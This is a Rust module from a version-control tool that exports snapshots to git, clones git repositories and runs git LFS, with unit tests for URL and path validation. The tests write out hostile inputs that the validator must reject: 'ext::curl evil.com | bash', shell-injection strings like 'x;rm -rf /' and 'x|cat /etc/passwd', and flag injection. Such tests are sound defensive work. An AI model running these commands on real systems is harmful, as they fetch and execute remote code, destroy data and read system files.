use std::{
    path::{Component, Path, PathBuf},
    process::Command,
    sync::Arc,
};

use crate::{
    error::{NoaError, Result},
    object::ObjectStore,
    refs::{RedbRefStore, RefStore},
    snapshot::{RedbSnapshotStore, SnapshotStore},
};

fn is_safe_relative_path(path: &str) -> bool {
    let pb = PathBuf::from(path);
    for comp in pb.components() {
        match comp {
            Component::Normal(_) => {}
            Component::CurDir => {}
            _ => return false,
        }
    }
    !path.is_empty()
}

pub fn validate_git_url(url: &str) -> Result<()> {
    if url.is_empty() {
        return Err(NoaError::Remote("empty URL".to_string()));
    }
    if url.starts_with('-') {
        return Err(NoaError::Remote("URL must not start with '-'".to_string()));
    }
    if url.contains('\0') || url.contains('\n') || url.contains('\r') {
        return Err(NoaError::Remote(
            "URL contains control characters".to_string(),
        ));
    }
    if url.starts_with("ext::") {
        return Err(NoaError::Remote(
            "ext:: transport is not allowed for security reasons".to_string(),
        ));
    }
    let looks_valid = url.starts_with("https://")
        || url.starts_with("http://")
        || url.starts_with("git://")
        || url.starts_with("ssh://")
        || url.starts_with("file:///")
        || url.starts_with('/');
    if !looks_valid {
        let has_scp_syntax = url.contains(':')
            && !url.contains("://")
            && url.split_once(':').is_some_and(|(before, _)| {
                !before.is_empty() && !before.contains('/') && !before.starts_with('-')
            });
        if !has_scp_syntax {
            return Err(NoaError::Remote(format!("invalid git URL format: {}", url)));
        }
    }
    Ok(())
}

pub fn detect_lfs_available(repo_root: &Path) -> bool {
    Command::new("git")
        .args(["lfs", "version"])
        .current_dir(repo_root)
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

pub fn lfs_install(repo_root: &Path) {
    let _ = Command::new("git")
        .args(["lfs", "install"])
        .current_dir(repo_root)
        .status();
}

pub fn lfs_pull(repo_root: &Path) {
    let _ = Command::new("git")
        .args(["lfs", "pull"])
        .current_dir(repo_root)
        .status();
}

pub fn lfs_push_all(repo_root: &Path, remote_url: &str) {
    let _ = Command::new("git")
        .args(["lfs", "push", "--all", remote_url])
        .current_dir(repo_root)
        .status();
}

pub fn has_lfs_tracking(repo_root: &Path) -> bool {
    repo_root.join(".gitattributes").exists()
        || Command::new("git")
            .args(["lfs", "track"])
            .current_dir(repo_root)
            .output()
            .map(|o| !o.stdout.is_empty())
            .unwrap_or(false)
}

pub async fn export_noa_to_git(repo_root: &Path, db: Arc<redb::Database>) -> Result<()> {
    let git_dir = repo_root.join(".git");
    if !git_dir.exists() {
        return Err(NoaError::Remote(".git directory not found".to_string()));
    }

    let snap_store = RedbSnapshotStore::new(Arc::clone(&db))?;
    let ref_store = RedbRefStore::new(Arc::clone(&db))?;
    let ws_mgr = crate::workspace::WorkspaceManager::new(Arc::clone(&db))?;
    let obj_store = crate::object::RedbObjectStore::new(db)?;

    let head_ws = std::fs::read_to_string(repo_root.join(".noa").join("HEAD"))
        .map_err(NoaError::Io)?
        .trim()
        .to_string();

    let ws = ws_mgr.get(&head_ws).await?;
    let snap_id = match ws {
        Some(w) => w.head,
        None => {
            let head_ref = ref_store.get("HEAD").await?;
            match head_ref {
                Some(id) => id,
                None => return Err(NoaError::Remote("no HEAD snapshot found".to_string())),
            }
        }
    };
    let snapshot = snap_store.get(&snap_id).await?;

    let tree = obj_store
        .get_tree(&crate::object::TreeId(snapshot.tree_hash.clone()))
        .await?;

    for entry in &tree.0 {
        if !is_safe_relative_path(&entry.name) {
            tracing::warn!("skipping unsafe path in export tree entry: {}", entry.name);
            continue;
        }
        let file_path = repo_root.join(&entry.name);
        if let Some(parent) = file_path.parent() {
            if parent.exists() {
                if let Ok(canonical_parent) = parent.canonicalize() {
                    let canonical_root = repo_root
                        .canonicalize()
                        .unwrap_or_else(|_| repo_root.to_path_buf());
                    if !canonical_parent.starts_with(&canonical_root) {
                        tracing::warn!(
                            "skipping path traversal in export tree entry: {}",
                            entry.name
                        );
                        continue;
                    }
                }
            }
        }
        if let Some(parent) = file_path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        let blob = obj_store
            .get_blob(&crate::object::BlobId(entry.id.clone()))
            .await?;
        std::fs::write(&file_path, &blob)?;
    }

    if has_lfs_tracking(repo_root) && detect_lfs_available(repo_root) {
        let _ = Command::new("git")
            .args(["lfs", "install"])
            .current_dir(repo_root)
            .status();
    }

    let status_output = Command::new("git")
        .args(["status", "--porcelain"])
        .current_dir(repo_root)
        .output()
        .map_err(|e| NoaError::Remote(format!("git status failed: {}", e)))?;

    let has_changes = !status_output.stdout.is_empty();
    if has_changes {
        Command::new("git")
            .args(["add", "-A"])
            .current_dir(repo_root)
            .status()
            .map_err(|e| NoaError::Remote(format!("git add failed: {}", e)))?;

        let msg = format!(
            "[noa export] snapshot {} from workspace {}",
            snapshot.id, snapshot.workspace
        );
        Command::new("git")
            .args(["commit", "-m", &msg])
            .current_dir(repo_root)
            .env("GIT_AUTHOR_NAME", &snapshot.author)
            .env("GIT_AUTHOR_EMAIL", "noa@noa.local")
            .env("GIT_COMMITTER_NAME", &snapshot.author)
            .env("GIT_COMMITTER_EMAIL", "noa@noa.local")
            .status()
            .map_err(|e| NoaError::Remote(format!("git commit failed: {}", e)))?;
    }

    Ok(())
}

pub async fn clone_git_to_noa(url: &str, target: &Path) -> Result<()> {
    validate_git_url(url)?;

    Command::new("git")
        .args(["clone", url, &target.to_string_lossy()])
        .status()
        .map_err(|e| NoaError::Remote(format!("git clone failed: {}", e)))
        .and_then(|s| {
            if s.success() {
                Ok(())
            } else {
                Err(NoaError::Remote(
                    "git clone exited with non-zero status".to_string(),
                ))
            }
        })?;

    let config = crate::config::RemoteConfig {
        name: "origin".to_string(),
        url: url.to_string(),
        protocol: "git".to_string(),
    };
    let repo = crate::repo::Repository::init_with_remotes(target, vec![config])?;

    let db = Arc::clone(&repo.db);
    super::import::import_git_to_noa(target, Arc::clone(&db)).await?;

    let ref_store = crate::refs::RedbRefStore::new(Arc::clone(&db))?;
    let head_ref = ref_store.get("HEAD").await.ok().flatten();
    let head_snap_id = head_ref.unwrap_or_else(crate::snapshot::empty_snapshot_id);

    let ws_mgr = crate::workspace::WorkspaceManager::new(Arc::clone(&db))?;
    let now = crate::now_micros();
    ws_mgr
        .create(&crate::workspace::Workspace {
            name: "default".to_string(),
            head: head_snap_id.clone(),
            base: head_snap_id.clone(),
            agent_id: None,
            last_seq: 0,
            created_at: now,
            updated_at: now,
        })
        .await
        .ok();

    if detect_lfs_available(target) {
        lfs_install(target);
        if has_lfs_tracking(target) {
            lfs_pull(target);
        }
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_safe_relative_path_normal() {
        assert!(is_safe_relative_path("src/main.rs"));
        assert!(is_safe_relative_path("a/b/c.txt"));
        assert!(is_safe_relative_path("file.rs"));
        assert!(is_safe_relative_path("./foo.rs"));
        assert!(is_safe_relative_path("a/./b/./c.rs"));
    }

    #[test]
    fn test_is_safe_relative_path_traversal() {
        assert!(!is_safe_relative_path("../etc/passwd"));
        assert!(!is_safe_relative_path("foo/../../bar"));
        assert!(!is_safe_relative_path("../../root"));
        assert!(!is_safe_relative_path("/etc/passwd"));
    }

    #[test]
    fn test_is_safe_relative_path_empty() {
        assert!(!is_safe_relative_path(""));
    }

    #[test]
    fn test_validate_git_url_valid() {
        assert!(validate_git_url("https://github.com/user/repo.git").is_ok());
        assert!(validate_git_url("http://example.com/repo").is_ok());
        assert!(validate_git_url("git://example.com/repo").is_ok());
        assert!(validate_git_url("ssh://git@github.com/user/repo.git").is_ok());
        assert!(validate_git_url("file:///path/to/repo").is_ok());
        assert!(validate_git_url("git@github.com:user/repo.git").is_ok());
        assert!(validate_git_url("/absolute/path").is_ok());
    }

    #[test]
    fn test_validate_git_url_empty() {
        assert!(validate_git_url("").is_err());
    }

    #[test]
    fn test_validate_git_url_dash_prefix() {
        assert!(validate_git_url("-flagInjection").is_err());
    }

    #[test]
    fn test_validate_git_url_control_chars() {
        assert!(validate_git_url("https://x.com\0").is_err());
        assert!(validate_git_url("https://x.com\nextra").is_err());
        assert!(validate_git_url("https://x.com\r\nextra").is_err());
    }

    #[test]
    fn test_validate_git_url_ext_transport_blocked() {
        assert!(validate_git_url("ext::/bin/sh -c id").is_err());
        assert!(validate_git_url("ext::curl evil.com | bash").is_err());
    }

    #[test]
    fn test_validate_git_url_scp_style() {
        assert!(validate_git_url("git@github.com:user/repo.git").is_ok());
        assert!(validate_git_url("user@host:path/to/repo").is_ok());
    }

    #[test]
    fn test_validate_git_url_invalid() {
        assert!(validate_git_url("not-a-url").is_err());
        assert!(validate_git_url("random string").is_err());
    }

    #[test]
    fn test_validate_git_url_backtick_injection() {
        assert!(validate_git_url("repo`rm -rf /`").is_err());
    }

    #[test]
    fn test_validate_git_url_dollar_injection() {
        assert!(validate_git_url("$(whoami)").is_err());
    }

    #[test]
    fn test_validate_git_url_semicolon() {
        assert!(validate_git_url("x;rm -rf /").is_err());
    }

    #[test]
    fn test_validate_git_url_pipe() {
        assert!(validate_git_url("x|cat /etc/passwd").is_err());
    }

    #[test]
    fn test_validate_git_url_git_clone_flag() {
        assert!(validate_git_url("--config=user.name=evil").is_err());
    }

    #[test]
    fn test_validate_git_url_newline_in_scheme() {
        assert!(validate_git_url("https://x.com\nextra/path").is_err());
    }

    #[test]
    fn test_is_safe_relative_path_dot_dot_substring() {
        assert!(is_safe_relative_path("foo..bar.rs"));
        assert!(is_safe_relative_path("a..rs"));
    }

    #[test]
    fn test_is_safe_relative_path_only_dot_dot() {
        assert!(!is_safe_relative_path(".."));
        assert!(!is_safe_relative_path("../"));
    }
}
